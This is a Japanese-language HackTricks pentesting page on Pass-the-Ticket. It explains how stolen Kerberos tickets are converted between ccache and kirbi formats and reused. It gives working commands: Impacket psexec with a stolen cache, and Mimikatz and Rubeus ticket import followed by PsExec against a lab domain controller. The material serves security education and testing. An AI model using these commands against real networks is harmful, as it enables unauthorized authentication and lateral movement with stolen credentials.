# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 概要

Pass-the-Ticket (PtT)攻撃では、攻撃者は盗んだKerberos ticketを使用して、そのアカウントのパスワードを持たずにticketのprincipalとして認証します。ticket-granting ticket (TGT)はservice ticketの要求に使用できますが、盗まれたservice ticketは対象のserviceと有効期間に制限されます。<sup>[[1]](#references)</sup>

ticket取得techniqueについては、以下を参照してください。

- [Windowsからのticketの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linuxからのticketの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## LinuxとWindowsのTicket Formatの変換

Kerberos cacheは、LinuxではMIT `ccache` file、Windowsでは`.kirbi` fileとして一般的に現れます。`ticket_converter`は、入力ticketと出力pathを使用して、これらのformat間を変換します。<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo は Windows 上で Kerberos ticket のツールも提供します。<sup>[[3]](#references)</sup>

## Ticket の使用

Linux では、`KRB5CCNAME` を cache に指定し、Impacket クライアントに password の入力を求めず Kerberos を使用するよう指示します。<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Windowsでは、MimikatzまたはRubeusを使用して、`.kirbi` ticketを現在のlogon sessionにimportできます。結果のcacheを確認するには`klist`を使用します。<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticketのimportでは、Ticketによって表される権限および対象サービスのauthorization policyで許可されている権限を超えるprivilegesは付与されません。期限切れ、revoked、不正な形式、またはscopeが正しくないTicketは失敗する可能性があります。<sup>[[1]](#references)</sup>

Kerberos攻撃のより広範なcontextおよび関連するTicket取得techniqueについては、TarlogicのKerberos攻撃ガイドを参照してください。<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacketの例](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos攻撃technique](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
